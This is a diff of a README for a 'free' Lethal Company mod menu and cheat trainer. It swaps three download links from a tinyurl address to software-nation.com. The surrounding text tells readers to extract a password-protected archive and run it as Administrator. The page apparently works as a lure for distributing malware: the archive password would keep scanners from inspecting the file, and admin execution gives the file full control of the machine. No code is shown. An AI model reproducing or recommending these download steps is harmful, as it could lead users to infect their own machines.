@@ -9,7 +9,7 @@ The **📦 Lethal Company Mod Menu** is a **free** trainer for Lethal Company th
 
 <div align="center">
 
-[![Download Lethal Company Mod Menu](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/lethal-company-m0d-menu)
+[![Download Lethal Company Mod Menu](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/lethal-company-m0d-menu)
 
 </div>
 
@@ -108,7 +108,7 @@ Lethal Company is brutal — one mistake and you're dead. This mod menu helps yo
 2. **📦 Extract the archive** — password: `2026`
 3. **🖱️ Run as Administrator** → Launch Lethal Company → Press `INSERT` for menu
 
-[![Download Lethal Company Mod Menu](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/lethal-company-m0d-menu)
+[![Download Lethal Company Mod Menu](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/lethal-company-m0d-menu)
 
 ### Detailed Installation (April 2026 Update)
 
@@ -260,7 +260,7 @@ Learn Lethal Company without dying constantly for free. **Lethal Company Mod Men
 
 <div align="center">
 
-[![Download Lethal Company Mod Menu](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://tinyurl.com/lethal-company-m0d-menu)
+[![Download Lethal Company Mod Menu](https://img.shields.io/badge/Download-purple?style=for-the-badge&logo=github)](https://software-nation.com/lethal-company-m0d-menu)
 
 **Version 4.6.1** — Free Lethal Company trainer. April 2026 update. Zero cost. No payment.
 
